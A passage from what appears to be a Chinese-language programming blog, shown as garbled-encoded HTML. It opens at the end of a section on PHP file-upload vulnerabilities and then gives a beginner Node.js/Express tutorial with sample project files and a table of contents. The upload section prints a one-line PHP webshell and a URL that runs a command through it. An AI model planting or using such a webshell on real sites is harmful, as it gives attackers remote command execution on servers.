åŠŸèƒ½æœªèƒ½æ­£ç¡®æ ¡éªŒä¸Šä¼ æ–‡ä»¶çš„åç¼€åæˆ– MIME ç±»å‹ï¼Œå…è®¸æ”»å‡»è€…ä¸Šä¼ æ¶æ„ PHP æ–‡ä»¶å¹¶ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶ã€‚</p><h3 id="åˆ©ç”¨æ­¥éª¤ï¼š"><a href="#åˆ©ç”¨æ­¥éª¤ï¼š" class="headerlink" title="åˆ©ç”¨æ­¥éª¤ï¼š"></a>åˆ©ç”¨æ­¥éª¤ï¼š</h3><ol><li>ä¸Šä¼ åŒ…å« PHP ä»£ç çš„ WebShellï¼Œå¦‚ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol><li>è®¿é—®ä¸Šä¼ çš„ PHP æ–‡ä»¶å¹¶æ‰§è¡Œå‘½ä»¤ï¼š</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/uploads/</span>shell.php?cmd=whoami<br></code></pre></td></tr></table></figure><h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h2 id="ç›®å½•-3"><a href="#ç›®å½•-3" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><h2 id="Node-js-é¡¹ç›®çš„åŸºæœ¬ç»“æ„"><a href="#Node-js-é¡¹ç›®çš„åŸºæœ¬ç»“æ„" class="headerlink" title="Node.js é¡¹ç›®çš„åŸºæœ¬ç»“æ„"></a><strong>Node.js é¡¹ç›®çš„åŸºæœ¬ç»“æ„</strong></h2><p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ <strong>Express é¡¹ç›®</strong>çš„ç›®å½•ç»“æ„ï¼Œé€‚åˆåˆå­¦è€…ç†è§£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">bashå¤åˆ¶ä»£ç /project-root<br>â”‚<br>â”œâ”€â”€ /node_modules         <span class="hljs-comment"># ä¾èµ–æ¨¡å—ï¼ˆé€šè¿‡ npm è‡ªåŠ¨ç®¡ç†ï¼‰</span><br>â”‚<br>â”œâ”€â”€ /public               <span class="hljs-comment"># é™æ€èµ„æºï¼ˆHTMLã€CSSã€JSã€å›¾ç‰‡ç­‰ï¼‰</span><br>â”‚   â”œâ”€â”€ index.html<br>â”‚   â”œâ”€â”€ styles.css<br>â”‚   â””â”€â”€ script.js<br>â”‚<br>â”œâ”€â”€ /routes               <span class="hljs-comment"># è·¯ç”±å®šä¹‰</span><br>â”‚   â”œâ”€â”€ index.js          <span class="hljs-comment"># é¦–é¡µè·¯ç”±</span><br>â”‚   â”œâ”€â”€ users.js          <span class="hljs-comment"># ç”¨æˆ·ç›¸å…³è·¯ç”±</span><br>â”‚<br>â”œâ”€â”€ /controllers          <span class="hljs-comment"># æ§åˆ¶å™¨é€»è¾‘</span><br>â”‚   â””â”€â”€ userController.js <span class="hljs-comment"># ç”¨æˆ·ä¸šåŠ¡é€»è¾‘å¤„ç†</span><br>â”‚<br>â”œâ”€â”€ /models               <span class="hljs-comment"># æ•°æ®æ¨¡å‹</span><br>â”‚   â””â”€â”€ userModel.js      <span class="hljs-comment"># ç”¨æˆ·æ•°æ®æ¨¡å‹ï¼ˆMongoDB / MySQLï¼‰</span><br>â”‚<br>â”œâ”€â”€ /views                <span class="hljs-comment"># æ¨¡æ¿æ–‡ä»¶ç›®å½•ï¼ˆEJS / Pug ç­‰æ¨¡æ¿å¼•æ“ï¼‰</span><br>â”‚   â””â”€â”€ index.ejs         <span class="hljs-comment"># é¦–é¡µæ¨¡æ¿</span><br>â”‚<br>â”œâ”€â”€ .<span class="hljs-built_in">env</span>                  <span class="hljs-comment"># ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶</span><br>â”œâ”€â”€ package.json          <span class="hljs-comment"># é¡¹ç›®ä¾èµ–æè¿°æ–‡ä»¶</span><br>â”œâ”€â”€ package-lock.json     <span class="hljs-comment"># ä¾èµ–ç‰ˆæœ¬é”å®šæ–‡ä»¶</span><br>â”œâ”€â”€ app.js                <span class="hljs-comment"># Express åº”ç”¨ä¸»å…¥å£</span><br>â””â”€â”€ README.md             <span class="hljs-comment"># é¡¹ç›®æ–‡æ¡£</span><br></code></pre></td></tr></table></figure><hr><h3 id="ç›®å½•ä¸æ–‡ä»¶è¯´æ˜"><a href="#ç›®å½•ä¸æ–‡ä»¶è¯´æ˜" class="headerlink" title="ç›®å½•ä¸æ–‡ä»¶è¯´æ˜"></a><strong>ç›®å½•ä¸æ–‡ä»¶è¯´æ˜</strong></h3><ol><li>**<code>/node_modules/</code>**ï¼š<ul><li>é€šè¿‡ <strong>npm</strong> å®‰è£…çš„æ‰€æœ‰ä¾èµ–åŒ…éƒ½ä¼šæ”¾åœ¨è¿™é‡Œã€‚</li><li><strong>æ— éœ€æ‰‹åŠ¨ç¼–è¾‘</strong>ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆã€‚</li></ul></li><li>**<code>/public/</code>**ï¼š<ul><li>å­˜æ”¾<strong>é™æ€èµ„æºæ–‡ä»¶</strong>ï¼Œå¦‚ HTML é¡µé¢ã€CSS æ–‡ä»¶ã€JavaScript æ–‡ä»¶ã€å›¾ç‰‡ç­‰ã€‚</li><li>è¿™äº›èµ„æºå¯ä»¥ç›´æ¥å¯¹å¤–æš´éœ²ï¼Œä¾›å®¢æˆ·ç«¯è®¿é—®ã€‚</li></ul></li><li>**<code>/routes/</code>**ï¼š<ul><li>å®šä¹‰ä¸åŒè·¯å¾„çš„ <strong>è·¯ç”±</strong>ï¼ˆä¾‹å¦‚ <code>/</code> æˆ– <code>/users</code>ï¼‰ã€‚</li><li>æ¯ä¸ªè·¯ç”±æ–‡ä»¶ä¼šå¯¼å‡ºä¸€ä¸ªè·¯ç”±æ¨¡å—ï¼Œä¾›ä¸»ç¨‹åº <code>app.js</code> ä½¿ç”¨ã€‚</li></ul></li><li>**<code>/controllers/</code>**ï¼š<ul><li>å­˜æ”¾<strong>ä¸šåŠ¡é€»è¾‘æ§åˆ¶å™¨</strong>ï¼Œè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶è¿”å›å“åº”ã€‚</li><li>æ§åˆ¶å™¨ä¼šè°ƒç”¨æ¨¡å‹å±‚ä¸æ•°æ®åº“äº¤äº’ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™è·¯ç”±å±‚ã€‚</li></ul></li><li>**<code>/models/</code>**ï¼š<ul><li>å®šä¹‰æ•°æ®åº“çš„ <strong>æ•°æ®æ¨¡å‹</strong>ã€‚å¦‚æœä½¿ç”¨ MongoDBï¼Œåˆ™ä¼šå®šä¹‰ Mongoose æ¨¡å‹ï¼›å¦‚æœä½¿ç”¨ MySQLï¼Œåˆ™ä¼šå®šä¹‰ ORM æ¨¡å‹ã€‚</li></ul></li><li>**<code>/views/</code>**ï¼š<ul><li>å­˜æ”¾ <strong>æ¨¡æ¿æ–‡ä»¶</strong>ï¼Œå¦‚ EJSã€Pugã€Handlebars ç­‰ï¼Œç”¨äºåŠ¨æ€æ¸²æŸ“ HTMLã€‚</li></ul></li><li>**<code>app.js</code>**ï¼š<ul><li><strong>Node.js åº”ç”¨çš„ä¸»å…¥å£</strong>æ–‡ä»¶ã€‚å®ƒåˆå§‹åŒ– Express æœåŠ¡å™¨ï¼Œå¹¶æŒ‚è½½è·¯ç”±å’Œä¸­é—´ä»¶ã€‚</li></ul></li><li>**<code>package.json</code>**ï¼š<ul><li>æè¿°é¡¹ç›®çš„ä¾èµ–ã€ç‰ˆæœ¬ä¿¡æ¯å’Œå¯åŠ¨è„šæœ¬ã€‚é€šè¿‡ <strong>npm install</strong> å®‰è£…çš„ä¾èµ–éƒ½ä¼šè®°å½•åœ¨è¿™é‡Œã€‚</li></ul></li><li>**<code>.env</code>**ï¼š<ul><li>ç”¨äºå­˜å‚¨æ•æ„Ÿçš„ç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€API å¯†é’¥ç­‰ã€‚</li></ul></li></ol><hr><h2 id="app-jsï¼ˆä¸»å…¥å£æ–‡ä»¶ï¼‰ç¤ºä¾‹"><a href="#app-jsï¼ˆä¸»å…¥å£æ–‡ä»¶ï¼‰ç¤ºä¾‹" class="headerlink" title="app.jsï¼ˆä¸»å…¥å£æ–‡ä»¶ï¼‰ç¤ºä¾‹"></a><strong>app.jsï¼ˆä¸»å…¥å£æ–‡ä»¶ï¼‰ç¤ºä¾‹</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">javascriptå¤åˆ¶ä»£ç <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">express</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">path</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">dotenv</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;dotenv&#x27;</span>);<br><br><span class="hljs-comment">// åŠ è½½ç¯å¢ƒå˜é‡</span><br>dotenv.<span class="hljs-title function_ invoke__">config</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">app</span> = <span class="hljs-title function_ invoke__">express</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.env.PORT || <span class="hljs-number">3000</span>;<br><br><span class="hljs-comment">// è®¾ç½®é™æ€èµ„æºç›®å½•</span><br>app.<span class="hljs-keyword">use</span>(express.<span class="hljs-built_in">static</span>(path.<span class="hljs-title function_ invoke__">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><span class="hljs-comment">// è®¾ç½®æ¨¡æ¿å¼•æ“ï¼ˆEJSï¼‰</span><br>app.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_ invoke__">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br><br><span class="hljs-comment">// è·¯ç”±</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">indexRouter</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;./routes/index&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">usersRouter</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;./routes/users&#x27;</span>);<br><br><span class="hljs-comment">// æŒ‚è½½è·¯ç”±</span><br>app.<span class="hljs-keyword">use</span>(<span class="hljs-string">&#x27;/&#x27;</span>, indexRouter);<br>app.<span class="hljs-keyword">use</span>(<span class="hljs-string">&#x27;/users&#x27;</span>, usersRouter);<br><br><span class="hljs-comment">// å¯åŠ¨æœåŠ¡å™¨</span><br>app.<span class="hljs-title function_ invoke__">listen</span>(PORT, () =&gt; &#123;<br>  console.<span class="hljs-title function_ invoke__">log</span>(`Server running on <span class="hljs-attr">http</span>://<span class="hljs-attr">localhost</span>:$&#123;PORT&#125;`);<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="ç¤ºä¾‹è·¯ç”±æ–‡ä»¶-routes-index-js"><a href="#ç¤ºä¾‹è·¯ç”±æ–‡ä»¶-routes-index-js" class="headerlink" title="ç¤ºä¾‹è·¯ç”±æ–‡ä»¶ (/routes/index.js)"></a><strong>ç¤ºä¾‹è·¯ç”±æ–‡ä»¶ (<code>/routes/index.js</code>)</strong></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascriptå¤åˆ¶ä»£ç <span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> router = express.<span class="hljs-title class_">Router</span>();<br><br><span class="hljs-comment">// å®šä¹‰é¦–é¡µè·¯ç”±</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Home Page&#x27;</span> &#125;);<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><hr><h2 id="ç¤ºä¾‹æ§åˆ¶å™¨æ–‡ä»¶-controllers-userController-js"><a href="#ç¤ºä¾‹æ§åˆ¶å™¨æ–‡ä»¶-controllers-userController-js" class="headerlink" title="ç¤ºä¾‹æ§åˆ¶å™¨æ–‡ä»¶ (/controllers/userController.js)"></a><strong>ç¤ºä¾‹æ§åˆ¶å™¨æ–‡ä»¶ (<code>/controllers/userController.js</code>)</strong></h2><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascriptå¤åˆ¶ä»£ç <span class="hljs-keyword">const</span> User = require(<span class="hljs-string">&#x27;../models/userModel&#x27;</span>);<br><br><span class="hljs-comment">// è·å–æ‰€æœ‰ç”¨æˆ·</span><br>exports.getAllUsers = <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> User.find(); <span class="hljs-comment">// ä»æ•°æ®åº“ä¸­æŸ¥è¯¢ç”¨æˆ·</span><br>    res.status(<span class="hljs-number">200</span>).json(users);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    res.status(<span class="hljs-number">500</span>).json(&#123; message: <span class="hljs-string">&#x27;Error retrieving users&#x27;</span> &#125;);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><hr><h2 id="ç¤ºä¾‹æ¨¡å‹æ–‡ä»¶-models-userModel-js"><a href="#ç¤ºä¾‹æ¨¡å‹æ–‡ä»¶-models-userModel-js" class="headerlink" title="ç¤ºä¾‹æ¨¡å‹æ–‡ä»¶ (/models/userModel.js)"></a><strong>ç¤ºä¾‹æ¨¡å‹æ–‡ä»¶ (<code>/models/userModel.js</code>)</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">javascriptå¤åˆ¶ä»£ç <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">mongoose</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);<br><br><span class="hljs-comment">// å®šä¹‰ç”¨æˆ·æ¨¡å‹</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">userSchema</span> = <span class="hljs-keyword">new</span> mongoose.<span class="hljs-title function_ invoke__">Schema</span>(&#123;<br>  <span class="hljs-attr">name</span>: &#123; <span class="hljs-attr">type</span>: String, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">email</span>: &#123; <span class="hljs-attr">type</span>: String, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">password</span>: &#123; <span class="hljs-attr">type</span>: String, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> &#125;<br>&#125;);<br><br>module.exports = mongoose.<span class="hljs-title function_ invoke__">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, userSchema);<br></code></pre></td></tr></table></figure><hr><h2 id="è¿è¡Œ-Node-js-é¡¹ç›®"><a href="#è¿è¡Œ-Node-js-é¡¹ç›®" class="headerlink" title="è¿è¡Œ Node.js é¡¹ç›®"></a><strong>è¿è¡Œ Node.js é¡¹ç›®</strong></h2><ol><li><p><strong>åˆå§‹åŒ–é¡¹ç›®</strong>ï¼š</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">bash<br><br><br>å¤åˆ¶ä»£ç <br><span class="hljs-built_in">npm</span> init -y<br></code></pre></td></tr></table></figure></li><li><p><strong>å®‰è£…ä¾èµ–</strong>ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bash</span><br><span class="hljs-keyword"></span><br><br>å¤åˆ¶ä»£ç <br>npm <span class="hljs-keyword">install </span>express mongoose dotenv ejs<br></code></pre></td></tr></table></figure></li><li><p><strong>è¿è¡Œé¡¹ç›®</strong>ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">bash<br><br><br>å¤åˆ¶ä»£ç <br><span class="hljs-keyword">node</span> <span class="hljs-title">app</span>.js<br></code></pre></td></tr></table></figure></li><li><p>æ‰“å¼€æµè§ˆå™¨è®¿é—®ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts">arduino<br><br><br>å¤åˆ¶ä»£ç <br><span class="hljs-symbol">http:</span><span class="hljs-comment">//localhost:3000</span><br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h2><p>ä¸€ä¸ªå…¸å‹çš„ <strong>Node.js Web é¡¹ç›®</strong>åŒ…å«ä»¥ä¸‹ç»“æ„ï¼š</p><ul><li>**<code>/public</code>**ï¼šå­˜æ”¾é™æ€èµ„æºï¼ˆHTMLã€CSSã€JSï¼‰ã€‚</li><li>**<code>/routes</code>**ï¼šå®šä¹‰è·¯ç”±ã€‚</li><li>**<code>/controllers</code>**ï¼šå¤„ç†ä¸šåŠ¡é€»è¾‘ã€‚</li><li>**<code>/models</code>**ï¼šå®šä¹‰æ•°æ®åº“æ¨¡å‹ã€‚</li><li>**<code>app.js</code>**ï¼šExpress åº”ç”¨çš„å…¥å£æ–‡ä»¶ã€‚</li></ul><h2 id="1-Node-js-åŸºç¡€"><a href="#1-Node-js-åŸºç¡€" class="headerlink" title="1. Node.js åŸºç¡€"></a>1. Node.js åŸºç¡€</h2><ul><li><a href="#11-%E4%BB%80%E4%B9%88%E6%98%AF-nodejs">1.1 ä»€ä¹ˆæ˜¯ Node.js</a></li><li><a href="#12-nodejs-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">1.2 Node.js å®‰è£…ä¸é…ç½®</a></li><li><a href="#13-nodejs-%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF">1.3 Node.js è¿è¡Œæœºåˆ¶ä¸äº‹ä»¶å¾ªç¯</a></li><li><a href="#14-nodejs-%E4%B8%8E-javascript-%E7%9A%84%E5%8C%BA%E5%88%AB">1.4 Node.js ä¸ JavaScript çš„åŒºåˆ«</a></li></ul><h2 id="2-æ¨¡å—ä¸åŒ…ç®¡ç†"><a href="#2-æ¨¡å—ä¸åŒ…ç®¡ç†" class="headerlink" title="2. æ¨¡å—ä¸åŒ…ç®¡ç†"></a>2. æ¨¡å—ä¸åŒ…ç®¡ç†</h2><ul><li><p><a href="#21-nodejs-%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97">2.1 Node.js å†…ç½®æ¨¡å—</a></p><ul><li><a href="#211-fs-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97">2.1.1 <code>fs</code> æ–‡ä»¶ç³»ç»Ÿæ¨¡å—</a></li><li><a href="#212-http-%E6%A8%A1%E5%9D%97">2.1.2 <code>http</code> æ¨¡å—</a></li><li><a href="#213-path-%E6%A8%A1%E5%9D%97">2.1.3 <code>path</code> æ¨¡å—</a></li><li><a href="#214-os-%E6%A8%A1%E5%9D%97">2.1.4 <code>os</code> æ¨¡å—</a></li><li><a href="#215-crypto-%E6%A8%A1%E5%9D%97">2.1.5 <code>crypto</code> æ¨¡å—</a></li></ul></li><li><p><a href="#22-%E4%BD%BF%E7%94%A8-npm-%E5%92%8C%E5%8C%85%E7%AE%A1%E7%90%86">2.2 ä½¿ç”¨ NPM å’ŒåŒ…ç®¡ç†</a></p><ul><li><a href="#221-npm-%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8">2.2.1 NPM çš„å®‰è£…å’Œä½¿ç”¨</a></li><li><a href="#222-%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96">2.2.2 ç®¡ç†é¡¹ç›®ä¾èµ–</a></li><li><a href="#223-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E4%B8%8E%E8%AF%AD%E4%B9%89%E5%8C%96%E7%89%88%E6%9C%AC">2.2.3 ç‰ˆæœ¬æ§åˆ¶ä¸è¯­ä¹‰åŒ–ç‰ˆæœ¬</a></li><li><a href="#224-%E4%BD%BF%E7%94%A8-packagejson-%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE">2.2.4 ä½¿ç”¨ <code>package.json</code> ç®¡ç†é¡¹ç›®</a></li></ul></li><li><p><a href="#23-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97%E4%B8%8E-commonjs-%E8%A7%84%E8%8C%83">2.3 è‡ªå®šä¹‰æ¨¡å—ä¸ CommonJS è§„èŒƒ</a></p><ul><li><a href="#231-%E5%AF%BC%E5%85%A5%E4%B8%8E%E5%AF%BC%E5%87%BA%E6%A8%A1%E5%9D%97">2.3.1 å¯¼å…¥ä¸å¯¼å‡ºæ¨¡å—</a></li><li><a href="#232-commonjs-%E5%92%8C-es6-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB">2.3.2 CommonJS å’Œ ES6 æ¨¡å—çš„åŒºåˆ«</a></li></ul></li></ul><h2 id="3-å¼‚æ­¥ç¼–ç¨‹"><a href="#3-å¼‚æ­¥ç¼–ç¨‹" class="headerlink" title="3. å¼‚æ­¥ç¼–ç¨‹"></a>3. å¼‚æ­¥ç¼–ç¨‹</h2><ul><li><p><a href="#31-%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80">3.1 å¼‚æ­¥ç¼–ç¨‹åŸºç¡€</a></p><ul><li><a href="#311-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">3.1.1 å›è°ƒå‡½æ•°</a></li><li><a href="#312-promise-%E5%AF%B9%E8%B1%A1">3.1.2 <code>Promise</code> å¯¹è±¡</a></li><li><a href="#313-asyncawait-%E8%AF%AD%E6%B3%95">3.1.3 <code>async/await</code> è¯­æ³•</a></li></ul></li><li><p><a href="#32-%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B">3.2 äº‹ä»¶é©±åŠ¨ç¼–ç¨‹</a></p><ul><li><a href="#321-%E4%BD%BF%E7%94%A8-eventemitter">3.2.1 ä½¿ç”¨ <code>EventEmitter</code></a></li><li><a href="#322-%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">3.2.2 è‡ªå®šä¹‰äº‹ä»¶å¤„ç†</a></li></ul></li><li><p><a href="#33-%E5%BC%82%E6%AD%A5%E6%8E%A7%E5%88%B6%E6%B5%81%E7%AE%A1%E7%90%86">3.3 å¼‚æ­¥æ§åˆ¶æµç®¡ç†</a></p><ul><li><a href="#331-asyncjs-%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8">3.3.1 <code>async.js</code> åº“çš„ä½¿ç”¨</a></li><li><a href="#332-%E5%BC%82%E6%AD%A5%E9%98%9F%E5%88%97%E4%B8%8E%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6">3.3.2 å¼‚æ­¥é˜Ÿåˆ—ä¸å¹¶å‘æ§åˆ¶</a></li></ul></li></ul><h2 id="4-æ–‡ä»¶æ“ä½œä¸-I-O"><a href="#4-æ–‡ä»¶æ“ä½œä¸-I-O" class="headerlink" title="4. æ–‡ä»¶æ“ä½œä¸ I&#x2F;O"></a>4. æ–‡ä»¶æ“ä½œä¸ I&#x2F;O</h2><ul><li><p><a href="#41-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C">4.1 æ–‡ä»¶ç³»ç»Ÿæ“ä½œ</a></p><ul><li><a href="#411-%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6">4.1.1 è¯»å–ä¸å†™å…¥æ–‡ä»¶</a></li><li><a href="#412-%E6%96%87%E4%BB%B6%E6%B5%81%E4%B8%8E%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">4.1.2 æ–‡ä»¶æµä¸å¤§æ–‡ä»¶å¤„ç†</a></li></ul></li><li><p><a href="#42-%E7%BD%91%E7%BB%9C-io-%E6%93%8D%E4%BD%9C">4.2 ç½‘ç»œ I&#x2F;O æ“ä½œ</a></p><ul><li><a href="#421-%E5%88%9B%E5%BB%BA-http-%E6%9C%8D%E5%8A%A1%E5%99%A8">4.2.1 åˆ›å»º HTTP æœåŠ¡å™¨</a></li><li><a href="#422-%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">4.2.2 å¤„ç†è¯·æ±‚ä¸å“åº”</a></li><li><a href="#423-%E4%BD%BF%E7%94%A8-https-%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1">4.2.3 ä½¿ç”¨ <code>https</code> æ¨¡å—è¿›è¡Œå®‰å…¨é€šä¿¡</a></li></ul></li></ul><h2 id="5-æ•°æ®åº“ä¸å­˜å‚¨"><a href="#5-æ•°æ®åº“ä¸å­˜å‚¨" class="headerlink" title="5. æ•°æ®åº“ä¸å­˜å‚¨"></a>5. æ•°æ®åº“ä¸å­˜å‚¨</h2><ul><li><p><a href="#51-%E4%BD%BF%E7%94%A8-mongodb">5.1 ä½¿ç”¨ MongoDB</a></p><ul><li><a href="#511-%E8%BF%9E%E6%8E%A5%E5%88%B0-mongodb">5.1.1 è¿æ¥åˆ° MongoDB</a></li><li><a href="#512-crud-%E6%93%8D%E4%BD%9C">5.1.2 CRUD æ“ä½œ</a></li><li><a href="#513-%E4%BD%BF%E7%94%A8-mongoose-%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1">5.1.3 ä½¿ç”¨ Mongoose 